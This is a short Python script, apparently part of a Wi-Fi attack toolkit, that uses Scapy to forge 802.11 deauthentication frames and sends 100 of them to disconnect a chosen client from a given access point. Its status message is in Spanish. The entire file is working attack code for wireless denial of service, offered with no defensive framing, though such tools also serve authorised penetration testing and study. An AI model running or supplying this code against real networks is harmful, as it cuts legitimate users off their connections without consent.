# deauth/deauthenticate.py
from scapy.all import *

def start_deauth(interface, bssid, client):
    dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    print(f"Enviando paquetes de desautenticación a {client} en la red {bssid}")
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)